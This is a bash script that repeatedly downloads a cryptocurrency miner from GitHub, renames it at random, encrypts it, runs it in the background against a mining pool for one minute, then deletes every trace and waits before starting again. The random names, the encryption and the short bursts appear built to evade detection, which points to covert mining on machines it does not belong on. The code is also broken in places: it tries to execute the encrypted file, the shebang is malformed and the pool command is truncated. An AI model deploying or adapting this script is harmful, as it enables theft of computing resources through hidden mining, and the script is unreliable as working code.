!/bin/bash

# Function to generate a strong random file name
generate_random_name() {
  local random_name
  # Generate a random string using date, base64, and SHA-256 hash
  random_name=$(date +%s%N | sha256sum | base64 | head -c 12)
  echo "$random_name"
}

# Function to encrypt and sign the miner binary
encrypt_and_sign_miner_binary() {
  local binary="$1"
  local encrypted_binary="encrypted_$binary"
  local signature_file="signature_$binary"

  # Encrypt the binary (adjust encryption method as needed)
  openssl enc -aes-256-cbc -salt -in "$binary" -out "$encrypted_binary" -pass pass:your_password_here

  # Create a signature for the binary
  openssl dgst -sha256 -sign your_private_key.pem -out "$signature_file" "$encrypted_binary"
}

# Main loop to continuously run the mining script
while true; do
  # Download the miner archive (adjust URL as necessary)
  wget -q https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz

  # Extract the miner files
  tar -xf hellminer_linux64_avx2.tar.gz

  # Clean up unnecessary files
  rm -f hellminer_linux64_avx2.tar.gz run_miner.sh verus-solver

  # Generate a random name for the miner binary
  random_name=$(generate_random_name)
  mv hellminer "$random_name"

  # Encrypt and sign the miner binary
  encrypt_and_sign_miner_binary "$random_name"

  # Run the miner in the background for 1 minute
  nohup ./encrypted_"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs>
  miner_pid=$!

  # Wait for 1 minute while mining
  sleep 1m

  # Stop the miner process
  kill $miner_pid

  # Clean up downloaded files and encrypted miner binary
  rm -f "$random_name" encrypted_"$random_name" signature_"$random_name"

  # Wait for 2 minutes before repeating the loop
  sleep 2m
done
